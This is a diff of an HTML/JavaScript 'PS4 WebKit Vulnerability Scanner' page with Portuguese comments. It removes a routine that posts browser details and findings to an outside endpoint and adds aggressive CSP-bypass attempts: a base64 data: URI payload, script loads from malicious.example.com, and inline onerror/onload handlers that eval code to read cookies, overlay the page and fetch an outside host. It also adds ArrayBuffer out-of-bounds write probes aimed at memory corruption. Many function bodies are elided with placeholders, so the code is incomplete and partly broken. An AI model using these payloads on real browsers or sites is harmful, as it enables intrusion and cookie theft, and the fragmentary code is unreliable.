@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 WebKit Vulnerability Scanner | POC + Direct Impact + Notification</title>
+    <title>PS4 WebKit Vulnerability Scanner | Aggressive POC + Direct Impact</title>
     <style>
         /* Estilos CSS permanecem os mesmos */
         body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
@@ -19,25 +19,23 @@
         .defense-bypass { color: #00BCD4; font-weight: bold; }
         .privilege-escalation { color: #FF4081; font-weight: bold; }
         .impact { color: #E91E63; font-style: italic; }
-        .notification { color: #7B1FA2; font-style: italic; } /* Classe para logs de notificação */
     </style>
 </head>
 <body>
-    <h1>PS4 WebKit Vulnerability Scanner | POC + Direct Impact + Notification</h1>
+    <h1>PS4 WebKit Vulnerability Scanner | Aggressive POC + Direct Impact</h1>
 
     <div id="browserInfo">
         <strong>User Agent:</strong> <span id="userAgent"></span><br>
         <strong>Platform:</strong> <span id="platform"></span><br>
-        <strong>Notification Endpoint:</strong> <span id="notificationEndpointDisplay"></span>
     </div>
 
     <div>
         <select id="testSelector">
-            <option value="all_aggressive">Run All Aggressive Tests (Direct Impact + Notify)</option>
+            <option value="all_aggressive">Run All Aggressive Tests (Direct Impact)</option>
             <option value="oob_write_aggressive">Aggressive ArrayBuffer OOB Write Investigation</option>
             <option value="oob_impact_tests">OOB Impact Demonstration Tests</option>
-            <option value="csp_bypass_aggressive">Aggressive CSP Bypass Attempts (Direct Impact + Notify)</option>
-        </select>
+            <option value="csp_bypass_aggressive">Aggressive CSP Bypass Attempts (Direct Impact)</option>
+            </select>
         <button onclick="runSelectedTest()">Run Selected Test (Aggressive)</button>
         <button onclick="clearLog()">Clear Log</button>
     </div>
@@ -46,250 +44,258 @@
 
 <script>
 // ======================
-// CONFIGURAÇÃO IMPORTANTE!
+// Coleta de Informações e Logging (sem alterações)
 // ======================
-// SUBSTITUA ESTA URL PELO SEU ENDPOINT PARA RECEBER AS NOTIFICAÇÕES
-// Exemplo usando httpbin (ele apenas ecoa o POST): 'https://httpbin.org/post'
-// Use um serviço como Beeceptor.com ou seu próprio servidor.
-const NOTIFICATION_ENDPOINT = 'https://httpbin.org/post'; // <-- MUDE AQUI!
+document.addEventListener('DOMContentLoaded', function() { /* ... código ... */ });
+function log(message, type = '') { /* ... código ... */ }
+function clearLog() { /* ... código ... */ }
 
-// ======================
-// Coleta de Informações e Logging
-// ======================
-document.addEventListener('DOMContentLoaded', function() {
-    // ... (código de userAgent/platform idêntico) ...
-    const endpointDisplay = document.getElementById('notificationEndpointDisplay');
-    if(endpointDisplay) endpointDisplay.textContent = NOTIFICATION_ENDPOINT;
-});
-function log(message, type = '') { /* ... código idêntico ... */ }
-function clearLog() { /* ... código idêntico ... */ }
-
-// Flag global APENAS para OOB
+// Flag global APENAS para OOB (CSP não precisa mais dela para impacto)
 var potentialVulnsFound = {
     oobWrite: false
 };
 
 // ======================
-// Função para Enviar Notificação
+// Funções Auxiliares para Demonstração de Impacto (agora globais)
 // ======================
-async function sendVulnerabilityNotification(payload) {
-    log(`[NOTIFY] Sending notification for: ${payload.vulnerability}...`, 'notification info');
+function demonstrateCookieRead() {
     try {
-        const response = await fetch(NOTIFICATION_ENDPOINT, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                finding: payload // O objeto com os detalhes da vulnerabilidade
-            }),
-            mode: 'cors' // Geralmente necessário para endpoints de terceiros
-        });
-
-        if (response.ok) {
-            log(`[NOTIFY] Notification sent successfully to ${NOTIFICATION_ENDPOINT}. Status: ${response.status}`, 'notification success');
-            // const responseData = await response.json(); // Opcional: logar resposta do endpoint (útil com httpbin)
-            // console.log("Notification Response:", responseData);
-        } else {
-            log(`[NOTIFY] Failed to send notification. Status: ${response.status}`, 'notification danger');
-        }
-    } catch (error) {
-        log(`[NOTIFY] Error sending notification: ${error.message}`, 'notification danger');
-        console.error("Notification Fetch Error:", error);
+        const cookies = document.cookie || '(no cookies found or readable)';
+        log('[IMPACT-CSP] Cookie Read Attempt Result: ' + cookies, 'impact danger');
+    } catch(e) {
+        log('[IMPACT-CSP] Error reading cookies: ' + e.message, 'danger');
     }
 }
 
+function demonstrateDomManipulation() {
+    try {
+        const divId = 'csp-impact-div-' + Date.now();
+        const div = document.createElement('div');
+        div.id = divId;
+        div.style.position = 'fixed';
+        div.style.top = '0'; div.style.left = '0'; div.style.width = '100%';
+        div.style.background = 'red'; div.style.color = 'white';
+        div.style.textAlign = 'center'; div.style.padding = '10px';
+        div.style.zIndex = '9999';
+        div.textContent = '!! CSP Bypass Impact: DOM Manipulation Successful !!';
+        // Remover qualquer div anterior para não poluir
+        const oldDiv = document.getElementById('csp-impact-div-active');
+        if(oldDiv) { try{ document.body.removeChild(oldDiv); } catch(e){} }
+        div.id = 'csp-impact-div-active'; // Marcar a ativa
+        document.body.appendChild(div);
+        log('[IMPACT-CSP] DOM Manipulation Executed: Injected red bar.', 'impact danger');
+        // setTimeout(() => { try { document.body.removeChild(div); } catch(e){} }, 5000); // Opcional: Remover após 5s
+    } catch(e) {
+        log('[IMPACT-CSP] Error manipulating DOM: ' + e.message, 'danger');
+    }
+}
+
+function demonstrateNetworkRequest() {
+    const targetUrl = 'https://httpbin.org/get?csp_bypass_poc_direct=true'; // Exemplo usando httpbin
+    try {
+        log('[IMPACT-CSP] Attempting network request (fetch) to ' + targetUrl + '...', 'info');
+        fetch(targetUrl)
+            .then(response => {
+                if (response.ok) {
+                    log('[IMPACT-CSP] Network Request Successful: Received response from ' + targetUrl + '. Status: ' + response.status, 'impact danger');
+                } else {
+                    log('[IMPACT-CSP] Network Request Failed: Received non-OK response from ' + targetUrl + '. Status: ' + response.status, 'warning');
+                }
+            })
+            .catch(error => {
+                log('[IMPACT-CSP] Network Request Error: Could not fetch ' + targetUrl + '. Error: ' + error.message, 'warning');
+                log('[IMPACT-CSP] Note: Check CSP connect-src, CORS, network issues.', 'info');
+            });
+    } catch(e) {
+        log('[IMPACT-CSP] Error attempting fetch: ' + e.message, 'danger');
+    }
+}
 
 // ======================
-// Funções Auxiliares para Demonstração de Impacto (globais, sem alterações)
-// ======================
-function demonstrateCookieRead() { /* ... código idêntico ... */ }
-function demonstrateDomManipulation() { /* ... código idêntico ... */ }
-function demonstrateNetworkRequest() { /* ... código idêntico ... */ }
-
-
-// ======================
-// Aggressive POC Tests (Com Notificações Integradas)
+// Aggressive POC Tests (Com Impacto Direto no CSP)
 // ======================
 const aggressiveTests = {
 
-    // --- Teste OOB Original ---
-    "oob_write_aggressive": async function() {
-        log("[EXPLOIT] Aggressive ArrayBuffer OOB Write Investigation...", "info");
-        potentialVulnsFound.oobWrite = false;
-        // ... (setup idêntico: bufferSize, buffer, view, writeValue, offsets, readOffsets) ...
-        const bufferSize = 32; /*...*/ const view = new Uint8Array(new ArrayBuffer(bufferSize)); /*...*/
-
-        for (const writeOffset of offsets) {
-            // ... (log de tentativa idêntico) ...
-            try {
-                view[writeOffset] = writeValue;
-                log(`⚠️ OOB write at offset ${writeOffset} successful (no error).`, "warning");
-                 potentialVulnsFound.oobWrite = true;
-                 // NOTIFICAÇÃO: Sucesso na escrita OOB (pode ser muito verboso, talvez comentar?)
-                 // sendVulnerabilityNotification({ vulnerability: 'OOB_WRITE_SUCCESS', details: `Write at offset ${writeOffset} did not error.` });
-
-                for (const readOffset of readOffsets) {
-                    try {
-                        // ... (leitura idêntica) ...
-                        const readValue = view[readOffset]; /*...*/
-
-                        if (readOffset >= 0 && readOffset < bufferSize && readValue === writeValue && (writeOffset >= bufferSize || writeOffset < 0)) {
-                            const detailMsg = `Wrote at ${writeOffset}, read 0x${readValue.toString(16)} at IN-BOUNDS offset ${readOffset}.`;
-                            log(`<span class="poc-potential defense-bypass privilege-escalation">🚩 Potential OOB Write Corruption: ${detailMsg}</span>`, "danger");
-                            // <<< NOTIFICAÇÃO AQUI >>>
-                            sendVulnerabilityNotification({ vulnerability: 'OOB_WRITE_CORRUPTION', details: detailMsg });
-                        }
-                    } catch (readError) { /* ... log de erro de leitura ... */ }
-                }
-            } catch (writeError) { /* ... log de erro de escrita ... */ }
-            await new Promise(resolve => setTimeout(resolve, 100));
-        }
-        log("[OOB-AGG] Completed aggressive OOB write testing.", "info");
-        // ... (catch de erro geral idêntico) ...
-    },
-
-    // --- Testes de Impacto OOB ---
-    "test_oob_metadata": async function() {
-        log("[IMPACT-OOB] Attempting OOB write to corrupt metadata (e.g., length)...", "section");
-        // ... (check da flag oobWrite idêntico) ...
-        try {
-            // ... (setup idêntico: buffer, view, initialLength, suspectOffsets, writeValue) ...
-            const bufferSize = 32; /*...*/ const buffer = new ArrayBuffer(bufferSize); /*...*/
-
-            for(const offset of suspectOffsets) {
-                try {
-                    // ... (tentativa de escrita OOB idêntica) ...
-                    view[offset] = writeValue; /*...*/
-                    const currentLength = buffer.byteLength; /*...*/
-                    if (currentLength !== initialLength) {
-                        const detailMsg = `Buffer length changed from ${initialLength} to ${currentLength} after OOB write at offset ${offset}!`;
-                        log(`<span class="poc-potential privilege-escalation impact">🚨 Potential Metadata Corruption: ${detailMsg}</span>`, "danger impact");
-                        // <<< NOTIFICAÇÃO AQUI >>>
-                        sendVulnerabilityNotification({ vulnerability: 'OOB_METADATA_CORRUPTION', details: detailMsg });
-                        // ... (tentativa de acesso com tamanho corrompido idêntica) ...
-                        return;
-                    }
-                } catch(e_write) { /* ... log de erro de escrita ... */ }
-            }
-             log("[IMPACT-OOB] Metadata corruption test finished, no length change detected.", "info");
-        } catch (e) { /* ... catch geral idêntico ... */ }
-    },
-
-    "test_oob_crash_probe": async function() {
-         // Não há um ponto claro para enviar notificação ANTES do crash.
-         // O próprio crash é a evidência. Poderia enviar uma notificação
-         // *antes* de tentar um write perigoso, mas isso não confirma o crash.
-        log("[IMPACT-OOB] Attempting OOB writes with large offsets/values to probe for crashes...", "section");
-         // ... (check da flag e código principal idêntico) ...
-         // Nenhuma notificação automática adicionada aqui. O crash é o resultado.
-    },
+    // --- Testes OOB (sem alterações significativas) ---
+    "oob_write_aggressive": async function() { /* ... código idêntico ao anterior ... */ },
+    "test_oob_metadata": async function() { /* ... código idêntico ao anterior ... */ },
+    "test_oob_crash_probe": async function() { /* ... código idêntico ao anterior ... */ },
 
 
-    // --- Teste CSP (Modificado para Impacto Direto e Notificação) ---
+    // --- Teste CSP (Modificado para Impacto Direto) ---
      "csp_bypass_aggressive": async function() {
-        log("[PRIV-ESC] Aggressive CSP Bypass Attempts (Direct Impact + Notify)...", "info");
+        log("[PRIV-ESC] Aggressive CSP Bypass Attempts (with Direct Impact Demo)...", "info");
 
-        // ---- Preparar Payloads de Impacto (idêntico) ----
-        const impactPayloadJsString = `...`; // Mesma string JS
-        let impactPayloadBase64 = ''; try { impactPayloadBase64 = btoa(impactPayloadJsString); } catch (e) { /*...*/ } // Mesmo Base64
-        const impactPayloadInlineString = `...`; // Mesma string inline
+        // ---- Preparar Payloads de Impacto ----
+        // Payload para Data URI (precisa ser tudo em uma linha, depois Base64)
+        const impactPayloadJsString = `
+            console.log('Executing CSP Bypass Payload...');
+            demonstrateCookieRead();
+            demonstrateDomManipulation();
+            demonstrateNetworkRequest();
+            console.log('CSP Bypass Payload Execution Finished.');
+        `.replace(/\n\s*/g, ''); // Remove newlines and leading spaces for cleaner base64
 
-        // ---- Fontes a Testar (idêntico) ----
-        const scriptSources = [ `data:text/javascript;base64,${impactPayloadBase64}`, /*...*/ ];
+        // Codificar para Base64
+        let impactPayloadBase64 = '';
+        try {
+             impactPayloadBase64 = btoa(impactPayloadJsString);
+             log("[CSP-AGG] Generated Base64 payload for impact tests.", "info");
+        } catch (e) {
+             log("Error generating Base64 payload: " + e.message, "danger");
+             return; // Cannot proceed without payload
+        }
+
+        // Payload para Inline Handlers (cuidado com aspas)
+        // Usar aspas simples externamente se usar duplas internamente ou vice-versa
+        // Ou escapar as aspas. Usar template literals pode ajudar.
+        const impactPayloadInlineString = `
+            console.log('Executing Inline CSP Bypass Payload via event...');
+            demonstrateCookieRead();
+            demonstrateDomManipulation();
+            demonstrateNetworkRequest();
+            console.log('Inline CSP Payload Execution Finished.');
+        `.replace(/\n\s*/g, '').replace(/"/g, '&quot;'); // Escape double quotes for HTML attribute
+
+        // ---- Fontes a Testar ----
+        const scriptSources = [
+             // Data URI com impacto embutido
+             `data:text/javascript;base64,${impactPayloadBase64}`,
+             // Outras fontes (espera-se que falhem, como antes)
+            'http://malicious.example.com/script.js',
+            'https://malicious.example.com/script.js',
+            'blob:null/someBlob',
+            'javascript:console.log("javascript: URI executed - CSP Bypass?")', // Modificado para logar no console
+            'vbscript:msgbox("vbscript executed - CSP Bypass?")', // Modificado para logar no console
+            'ftp://malicious.example.com/script.js',
+            '//malicious.example.com/script.js',
+        ];
 
         // ---- Teste com <script src="..."> ----
         for (const src of scriptSources) {
-            // ... (log de tentativa idêntico) ...
+            log(`[CSP-AGG] Attempting script injection with src: ${src.substring(0,100)}${src.length > 100 ? '...' : ''}`, "info"); // Shorten long data URIs in log
             await new Promise(resolve => {
                  const script = document.createElement('script');
-                 const cleanup = () => { /*...*/ };
-                 script.onerror = () => { /*...*/ };
+                 const cleanup = () => { /* ... (mesmo código de cleanup) ... */ }; // Função de limpeza idêntica
+                 script.onerror = () => { /* ... (mesmo código onerror) ... */ }; // onerror idêntico
 
                  script.onload = () => {
-                     const successMsg = `Script loaded from ${src.substring(0,30)}...`;
-                     log(`<span class="poc-potential defense-bypass privilege-escalation impact">🚩 CSP Bypass Possible & Impact Executed: ${successMsg}</span>`, "danger impact");
-                     // <<< NOTIFICAÇÃO AQUI (para Data URI) >>>
-                     if (src.startsWith('data:')) {
-                          sendVulnerabilityNotification({
-                              vulnerability: 'CSP_BYPASS_DATA_URI',
-                              details: successMsg,
-                              impact_demonstrated: ['COOKIE_READ', 'DOM_MANIPULATION', 'NETWORK_REQUEST_ATTEMPTED']
-                          });
-                     }
-                     // Outros src que carregarem (improvável com CSP) também notificariam aqui
-                     else {
-                         sendVulnerabilityNotification({ vulnerability: 'CSP_BYPASS_OTHER_SRC', details: successMsg });
-                     }
+                     // Se 'onload' disparar, significa que o script (com impacto embutido, se for o data URI) executou
+                     log(`<span class="poc-potential defense-bypass privilege-escalation impact">🚩 CSP Bypass Possible & Impact Executed: Script loaded from ${src.substring(0,30)}...</span>`, "danger impact");
                      cleanup();
                  };
-                 try { /* ... (mesmo código try/catch para set src/append) ... */ } catch(e) { /*...*/ }
+
+                 try { /* ... (mesmo código try/catch para set src/append) ... */ } // try/catch idêntico
+                 catch(e) { /* ... (mesmo código catch) ... */ } // catch idêntico
             });
              await new Promise(resolve => setTimeout(resolve, 100));
         }
 
         // ---- Teste com script inline em atributos de evento ----
-        log("[CSP-AGG] Attempting inline script injection via event attributes (Direct Impact + Notify)...", "info");
-        const eventAttributes = ['onerror', 'onload'];
+        log("[CSP-AGG] Attempting inline script injection via event attributes (with Direct Impact Demo)...", "info");
+        const eventAttributes = ['onerror', 'onload']; // Focar nos mais prováveis de disparar programaticamente
 
         for (const attr of eventAttributes) {
             log(`[CSP-AGG] Setting up inline test for ${attr}...`, "info");
             await new Promise(async resolve => {
-                const testElement = document.createElement('img');
-                let bypassDetected = false;
-                const uniqueWrapperName = `cspInlineWrapper_${attr}_${Date.now()}`;
+                const testElement = document.createElement('img'); // Usar img para onload/onerror
+                let bypassDetected = false; // Flag local para este teste específico
 
-                window[uniqueWrapperName] = () => { // Esta função é chamada pelo evento se o bypass funcionar
-                     if (!bypassDetected) {
-                         const successMsg = `Inline script via ${attr} triggered!`;
-                         log(`<span class="poc-potential defense-bypass privilege-escalation impact">🚩 CSP Bypass Possible & Impact Executed: ${successMsg}</span>`, "danger impact");
+                // Definir uma função wrapper que será chamada pelo código inline
+                // para logar o sucesso ANTES de chamar as funções de impacto
+                const uniqueWrapperName = `cspInlineWrapper_${attr}_${Date.now()}`;
+                window[uniqueWrapperName] = () => {
+                     if (!bypassDetected) { // Logar apenas uma vez por tentativa
+                         log(`<span class="poc-potential defense-bypass privilege-escalation impact">🚩 CSP Bypass Possible & Impact Executed: Inline script via ${attr} triggered!</span>`, "danger impact");
                          bypassDetected = true;
-                         // <<< NOTIFICAÇÃO AQUI (para Inline) >>>
-                         sendVulnerabilityNotification({
-                             vulnerability: 'CSP_BYPASS_INLINE',
-                             event_handler: attr, // Informa qual evento funcionou
-                             details: successMsg,
-                             impact_demonstrated: ['COOKIE_READ', 'DOM_MANIPULATION', 'NETWORK_REQUEST_ATTEMPTED']
-                         });
                      }
-                     try {
-                        // Executar o payload de impacto real
-                        eval(impactPayloadInlineString.replace(/&quot;/g, '"'));
-                     } catch(evalError) { /*...*/ }
-                     console.log(`Inline payload potentially executed via ${attr}`);
+                     // Executar o código de impacto real
+                     eval(impactPayloadInlineString.replace(/&quot;/g, '"')); // Reverter escaping para eval
+                     console.log(`Inline payload executed via ${attr}`);
                 };
 
-                const inlineCode = `try { window['${uniqueWrapperName}'](); } catch(e) { console.error('Error in inline wrapper execution:', e); }`;
+                // O código no atributo agora apenas chama o wrapper global
+                const inlineCode = `window['${uniqueWrapperName}']();`;
                 testElement.setAttribute(attr, inlineCode);
 
-                // ... (disparar eventos e limpeza idênticos) ...
-                if (attr === 'onerror') { testElement.src = 'invalid-image-source-' + Math.random(); }
-                else if (attr === 'onload') { testElement.src = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7'; }
+                // Disparar eventos (como antes)
+                if (attr === 'onerror') {
+                     testElement.src = 'invalid-image-source-' + Math.random();
+                } else if (attr === 'onload') {
+                     testElement.src = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
+                }
+
                 document.body.appendChild(testElement);
-                await new Promise(resolve => setTimeout(resolve, 500));
-                if (!bypassDetected) { /*...*/ }
+                await new Promise(resolve => setTimeout(resolve, 500)); // Esperar para ver se disparou
+
+                if (!bypassDetected) {
+                   log(`[CSP-AGG] Inline script via ${attr} likely blocked or event not triggered.`, "info");
+                }
+
+                // Limpeza
                 try { document.body.removeChild(testElement); } catch(e){}
                 delete window[uniqueWrapperName];
                 resolve();
             });
-             await new Promise(resolve => setTimeout(resolve, 100));
+             await new Promise(resolve => setTimeout(resolve, 100)); // Delay entre atributos
         }
-        log("[CSP-AGG] Completed aggressive CSP bypass testing (Direct Impact + Notify).", "info");
+
+        log("[CSP-AGG] Completed aggressive CSP bypass testing (Direct Impact).", "info");
     },
 
     // --- Executor Principal (Atualizado) ---
-    "all_aggressive": async function() { /* ... código idêntico ao anterior ... */ },
-    "oob_impact_tests": async function() { /* ... código idêntico ao anterior ... */ }
+    "all_aggressive": async function() {
+        log("=== Running All Aggressive Tests (Direct Impact Version) ===", "section");
+
+        await aggressiveTests["oob_write_aggressive"]();
+        log("Pausing for 5 seconds after OOB write tests before OOB impact tests...", "info");
+        await new Promise(resolve => setTimeout(resolve, 5000));
+
+        if (potentialVulnsFound.oobWrite) { // Flag OOB ainda é útil aqui
+             await aggressiveTests["test_oob_metadata"]();
+             await new Promise(resolve => setTimeout(resolve, 1000));
+             await aggressiveTests["test_oob_crash_probe"]();
+              log("Pausing for 5 seconds after OOB impact tests before CSP tests...", "info");
+             await new Promise(resolve => setTimeout(resolve, 5000));
+        } else {
+             log("Skipping OOB impact tests as initial OOB write seemed unsuccessful.", "warning");
+        }
+
+        // Agora o teste CSP já inclui o impacto
+        await aggressiveTests["csp_bypass_aggressive"]();
+
+        log("\n=== All Aggressive Tests (Direct Impact Version) Completed. Review logs and browser behavior thoroughly. ===", "section");
+    },
+
+     // Mantém a opção de rodar só OOB Impact
+     "oob_impact_tests": async function() { /* ... código idêntico ao anterior ... */ }
+     // Remove a opção de rodar só CSP Impact, pois agora está embutido
+
 };
 
 // ======================
 // Test Runner (Atualizado)
 // ======================
-async function runSelectedTest() { /* ... código idêntico ao anterior ... */ }
+async function runSelectedTest() {
+    const testSelector = document.getElementById('testSelector');
+    const selectedTest = testSelector.value;
 
+    // Remover a opção de CSP Impact que não existe mais
+     if (selectedTest === "csp_impact_demonstration") {
+          log("Error: Separate CSP Impact test removed. Impact is now part of 'Aggressive CSP Bypass Attempts'.", "danger");
+          return;
+     }
+
+    clearLog();
+    log("=== Starting Selected Tests ===", "section");
+
+    if (aggressiveTests[selectedTest]) {
+        await aggressiveTests[selectedTest]();
+        log(`\n=== Test Execution for "${selectedTest}" Completed. Review logs and browser behavior closely. ===`, "section");
+    } else {
+        log(`Error: Test "${selectedTest}" not found.`, "danger");
+    }
+}
 </script>
 </body>
 </html>
